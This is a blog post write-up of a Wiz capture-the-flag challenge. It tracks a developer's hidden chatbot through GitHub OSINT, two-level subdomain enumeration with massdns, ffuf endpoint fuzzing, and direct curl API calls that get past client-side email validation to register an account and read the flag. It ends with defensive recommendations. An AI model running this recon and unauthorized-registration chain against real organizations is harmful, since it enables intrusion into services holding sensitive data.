---
layout: post
title: "Wiz CTF September 2025: Needle in a Haystack - Hunting the Rogue Developer's Unauthorized Chatbot"
date: 2025-12-28
categories: [ctf, security, web]
tags: [ctf, security, dns-enumeration, subdomain-discovery, api-exploitation, osint, pentesting, massdns]
excerpt: "A multi-layered reconnaissance challenge involving GitHub OSINT, nested subdomain enumeration, API discovery, and client-side authentication bypass to access a developer's unauthorized chatbot containing sensitive corporate data."
---

## Challenge Overview

This Wiz CTF challenge simulated a realistic insider threat scenario: a developer at Ack-Me Corp built an unauthorized side-project chatbot containing sensitive company data. The mission was to track down this hidden application and extract the flag through reconnaissance, subdomain enumeration, and API exploitation.

**Challenge Scenario:**
> We have got intelligence that one of our developers at Ack-Me Corp is working on a weekend side-project where he is vibe coding an internal knowledge-base chatbot for our company, where he put all of our customer records and sensitive data inside it.
>
> Your mission, if you choose to accept it - is to track down the website and obtain the secret flag.

**DNS Enumeration Shell Environment:**
```bash
=== DNS Enumeration Shell ===
Available tools:
  - massdns: High-performance DNS stub resolver
  - subfinder: Subdomain discovery tool
  - ffuf: Web fuzzer for directory/file discovery (limited to 5 threads)
  - httpx: HTTP toolkit for probing
  - curl, wget: HTTP clients
  - nslookup, dig, host: DNS tools
  - nmap: Network scanner
  - jq: Command-line JSON processor

Wordlists available in: /opt/wordlists/
  - subdomain-wordlist.txt: Subdomain enumeration wordlist
  - api-objects.txt: API endpoint/object discovery wordlist for ffuf

Resolvers available in: /opt/massdns/
```

## Attack Steps

### 1. GitHub OSINT - Finding the Developer

I started by searching GitHub for the company domain to see if any developer had leaked infrastructure information:

**Search Query:** `ackme-corp.net`

<img src="/docs/images/wiz_ctf/september_2025/needlehaystack_wizctf.png" alt="GitHub search revealing alejandro-pigeon user" style="max-width: 100%; height: auto;" />

**Discovery:**
- Found GitHub user: `alejandro-pigeon`
- User had repositories related to `ackme-corp.net`

### 2. Git History Analysis - Internal Domain Discovery

I examined the commit history in the developer's repositories:

<img src="/docs/images/wiz_ctf/september_2025/needlehaystack_wizctf-1.png" alt="Git commit revealing testing.internal.ackme-corp.net" style="max-width: 100%; height: auto;" />

**Critical Finding:**
- Commit messages revealed reference to `testing.internal.ackme-corp.net`
- This became the starting point for subdomain enumeration

### 3. DNS Reconnaissance - Confirming the Domain

```bash
dig testing.internal.ackme-corp.net
```

<img src="/docs/images/wiz_ctf/september_2025/needlehaystack_wizctf-2.png" alt="DNS query showing NOERROR with no A record" style="max-width: 100%; height: auto;" />

**Result:**
- DNS returned `NOERROR` status (domain exists in DNS)
- No A record present - indicating the domain exists but needs subdomain discovery
- This confirmed we were on the right track but needed to go deeper

### 4. First-Level Subdomain Enumeration

I created a wordlist targeting the internal domain:

```bash
# Generate subdomain list
for sub in $(cat /opt/wordlists/subdomain-wordlist.txt); do
  echo "$sub.testing.internal.ackme-corp.net"
done > subs.txt

# Verify the wordlist
head subs.txt
```

**Initial Attempt with massdns (Simple Output):**
```bash
massdns -r /opt/massdns/trusted-resolvers.txt subs.txt -o S -w results.txt
```

This showed `OK: 1 (0.02%)` but `results.txt` was empty. The issue was the output format.

**Retry with JSON Output:**
```bash
massdns -r /opt/massdns/trusted-resolvers.txt subs.txt -o J -w results.json

# Filter out non-existent domains
cat results.json | grep -v NXDOMAIN
```

<img src="/docs/images/wiz_ctf/september_2025/needlehaystack_wizctf-4.png" alt="massdns discovering pprod subdomain" style="max-width: 100%; height: auto;" />

**Discovery:**
- Found subdomain: `pprod.testing.internal.ackme-corp.net`
- This suggested there might be another level of subdomains to discover

### 5. Second-Level Subdomain Enumeration (Going Deeper!)

I performed subdomain enumeration on the discovered `pprod` subdomain to see if there were any nested services:

```bash
# Create second-level subdomain wordlist
for sub in $(cat /opt/wordlists/subdomain-wordlist.txt); do
  echo "$sub.pprod.testing.internal.ackme-corp.net"
done > level2_subs.txt

# Run massdns on second level
massdns -r /opt/massdns/trusted-resolvers.txt level2_subs.txt -o J -w level2_results.json
cat level2_results.json | grep -v NXDOMAIN
```

<img src="/docs/images/wiz_ctf/september_2025/needlehaystack_wizctf-5.png" alt="Discovering coding.pprod subdomain" style="max-width: 100%; height: auto;" />

**Critical Discovery:**
- Found: `coding.pprod.testing.internal.ackme-corp.net`
- This matched the "vibe coding" reference from the challenge description!

### 6. Application Discovery - The Developer's Chatbot

Accessing the discovered application:

```bash
curl http://coding.pprod.testing.internal.ackme-corp.net
```

<img src="/docs/images/wiz_ctf/september_2025/needlehaystack_wizctf-6.png" alt="Login page with vibecodeawebsitetoday.com reference" style="max-width: 100%; height: auto;" />

**Findings:**
- Login page for the chatbot application
- Footer contained reference: `vibecodeawebsitetoday.com`
- This linked to an external service used for "vibe coding"

### 7. API Endpoint Discovery - Finding the Docs

Using ffuf to discover API endpoints on the external vibe coding platform:

```bash
ffuf -u https://vibecodeawebsitetoday.com/FUZZ \
     -w /opt/wordlists/api-objects.txt \
     -mc 200,301,302
```

<img src="/docs/images/wiz_ctf/september_2025/needlehaystack_wizctf-7.png" alt="ffuf discovering /docs endpoint" style="max-width: 100%; height: auto;" />

**Discovery:**
- Found `/docs` endpoint containing API documentation
- Documentation revealed authentication requirements

### 8. API Documentation Analysis - Authentication Flow

<img src="/docs/images/wiz_ctf/september_2025/needlehaystack_wizctf-8.png" alt="API docs showing app_id requirement" style="max-width: 100%; height: auto;" />

**Key Requirements:**
- Login endpoint requires `app_id` parameter
- The chatbot application must have an embedded `app_id`

### 9. Application ID Extraction

Searching the login page source for the application ID:

```bash
curl -s http://coding.pprod.testing.internal.ackme-corp.net/login | grep -i "app"
```

<img src="/docs/images/wiz_ctf/september_2025/needlehaystack_wizctf-9.png" alt="Extracting app_id from HTML source" style="max-width: 100%; height: auto;" />

**Extracted:**
- Application ID successfully retrieved from HTML source
- Now had all parameters needed for authentication

### 10. Client-Side Validation Bypass - Understanding the Weakness

Initial login attempt with random credentials:

<img src="/docs/images/wiz_ctf/september_2025/needlehaystack_wizctf-10.png" alt="Client-side email validation" style="max-width: 100%; height: auto;" />

<img src="/docs/images/wiz_ctf/september_2025/needlehaystack_wizctf-11.png" alt="API accepting non-corporate email" style="max-width: 100%; height: auto;" />

**Critical Finding:**
- Client-side JavaScript validated that emails must be `@ackme-corp.net`
- However, the server-side API **accepted any email format**
- This was a classic client-side validation bypass vulnerability
- Server responded with `401 User not found` but **accepted the request format**

**Key Insight:** Since the API accepted arbitrary emails, I could register my own user account!

### 11. User Registration - Creating Access

Bypassing the client-side validation by calling the API directly:

```bash
curl -X POST https://vibecodeawebsitetoday.com/api/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "attacker@example.com",
    "password": "Password123!",
    "app_id": "extracted_app_id"
  }'
```

<img src="/docs/images/wiz_ctf/september_2025/needlehaystack_wizctf-12.png" alt="Successful user registration" style="max-width: 100%; height: auto;" />

**Success:**
- Registration returned `200 OK`
- User account successfully created
- Ready to authenticate and access the chatbot

### 12. Authentication and Flag Retrieval

Logging in with the newly created account:

```bash
# Login and capture session token
curl -isS -X POST https://vibecodeawebsitetoday.com/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "attacker@example.com",
    "password": "Password123!",
    "app_id": "extracted_app_id"
  }'
```

**Extracted:**
- Session token from `Set-Cookie: session_token=XXXXX` header

**Accessing the Chatbot:**
```bash
curl -s https://vibecodeawebsitetoday.com/api/chat \
  -H "Cookie: session_token=XXXXX" \
  -d '{"query": "What is the flag?"}'
```

<img src="/docs/images/wiz_ctf/september_2025/needlehaystack_wizctf-13.png" alt="Chatbot revealing the flag" style="max-width: 100%; height: auto;" />

**Flag:** `WIZ_CTF{N33dl3_F0und_1n_Th3_H4yst4ck}`

## Key Takeaways

This challenge demonstrated a realistic attack chain combining multiple reconnaissance and exploitation techniques:

### Attack Chain Summary

1. **OSINT (GitHub Search):** Identified developer through public repository commits
2. **Git History Analysis:** Discovered internal domain references in commit messages
3. **DNS Enumeration:** Confirmed domain existence through DNS queries
4. **First-Level Subdomain Discovery:** Found `pprod.testing.internal.ackme-corp.net`
5. **Second-Level Subdomain Discovery:** Found `coding.pprod.testing.internal.ackme-corp.net`
6. **Application Discovery:** Located the unauthorized chatbot application
7. **API Endpoint Discovery:** Found API documentation through directory fuzzing
8. **Authentication Analysis:** Understood authentication requirements and app_id mechanism
9. **Client-Side Bypass:** Identified client-side email validation vulnerability
10. **User Registration:** Created unauthorized account by calling API directly
11. **Authentication:** Obtained session token through API login
12. **Data Access:** Queried chatbot to retrieve sensitive flag

### Technical Lessons

**DNS Enumeration:**
- Use JSON output format (`-o J`) for easier parsing with massdns
- Multi-level subdomain enumeration is critical in complex infrastructure
- Don't stop at the first level - nested subdomains often hide interesting services

**OSINT:**
- Public repositories often contain infrastructure references in commits
- Developers may inadvertently leak internal domain names
- Git history is a goldmine for reconnaissance

**Client-Side Security:**
- Client-side validation is purely cosmetic and can be bypassed
- Always validate on the server-side, never trust client input
- API endpoints must enforce the same validation as the UI

**API Security:**
- Directory fuzzing against known domains can reveal documentation endpoints
- API documentation should be access-controlled
- Application IDs embedded in HTML are not secrets

### Security Recommendations

**For Developers:**
1. **Never rely on client-side validation alone** - always validate server-side
2. **Keep internal infrastructure references out of public repositories**
3. **Use `.gitignore` to prevent committing sensitive configuration**
4. **Don't embed API keys or app IDs in client-side code**

**For Organizations:**
1. **Monitor for shadow IT** - unauthorized applications built by employees
2. **Implement subdomain monitoring** - track new subdomains appearing in your infrastructure
3. **Require security review for internal tools** - even "weekend projects" can expose data
4. **Use private repositories** - prevent reconnaissance through public commits
5. **Implement network segmentation** - internal development environments should be isolated

**For Defenders:**
1. **Perform regular GitHub reconnaissance** - search for your domain in public repos
2. **Monitor DNS queries for enumeration patterns** - unusual subdomain query volumes
3. **Audit all API endpoints** - ensure validation is consistent between client and server
4. **Require authentication for API documentation** - don't expose API structure publicly

## Tools and Techniques Used

**Reconnaissance:**
- GitHub search for domain references
- Git commit history analysis
- DNS queries with `dig`

**Subdomain Enumeration:**
- `massdns` with custom wordlists
- Multi-level enumeration (subdomains of subdomains)
- JSON output parsing with `grep`

**Web Discovery:**
- `ffuf` for directory/endpoint fuzzing
- `curl` for API interaction
- HTML source inspection for app_id extraction

**Exploitation:**
- Client-side validation bypass
- Direct API calls with `curl`
- Session token extraction from HTTP headers

## Failed Approaches and Learning

**1. Initial massdns Output Format Issues**
- Used `-o S` (simple output) which didn't write results properly
- Switched to `-o J` (JSON output) for reliable parsing
- Lesson: Choose output formats that support your parsing workflow

**2. Trying subfinder and ffuf for Subdomain Enumeration**
- These tools failed in the restricted shell environment
- massdns proved more reliable with custom resolvers
- Lesson: Have multiple tools in your toolkit and understand their strengths

**3. Attempting to Bypass Authentication Without Understanding the Flow**
- Initially tried to guess API endpoints without documentation
- Discovery of `/docs` endpoint revealed the proper authentication flow
- Lesson: Finding documentation is often faster than brute force

## Real-World Context

This challenge simulates several real-world scenarios:

**Shadow IT Risk:**
Developers building unauthorized applications with corporate data happens regularly in enterprises. These side projects often:
- Lack security review or oversight
- Use production data in development environments
- Bypass corporate security controls
- Expose sensitive information through improper access controls

**Information Leakage through Git:**
Public repositories frequently leak:
- Internal domain names and infrastructure
- API endpoints and service architecture
- Configuration files with credentials
- Comments containing security-relevant information

**Client-Side Validation Vulnerabilities:**
Many applications still rely on JavaScript validation alone, creating vulnerabilities where:
- Attackers can call APIs directly
- Access controls can be bypassed
- Input validation can be circumvented

## Conclusion

This "Needle in a Haystack" challenge perfectly demonstrated that modern penetration testing requires more than just exploitation - it requires patience, thorough reconnaissance, and the ability to piece together information from multiple sources.

The attack succeeded not through complex exploits, but through:
- Systematic reconnaissance and enumeration
- Understanding multi-level infrastructure hierarchies
- Recognizing client-side security weaknesses
- Thinking like a developer who took shortcuts

**Time Investment:**
- OSINT and initial discovery: ~45 minutes
- Subdomain enumeration (two levels): ~1 hour
- API discovery and analysis: ~30 minutes
- Client-side bypass and exploitation: ~20 minutes
- Total: ~2.5 hours

**What Made This Challenge Great:**
- Realistic scenario (shadow IT is a real problem)
- Multi-stage reconnaissance requiring different techniques
- Combined OSINT, DNS enumeration, and web exploitation
- Required methodical enumeration at multiple infrastructure levels
- Client-side validation bypass is a common real-world vulnerability

**Personal Takeaway:**
This challenge reinforced that thorough reconnaissance is often more valuable than sophisticated exploits. Sometimes the key to finding the needle is simply being methodical in searching the haystack, one level at a time.
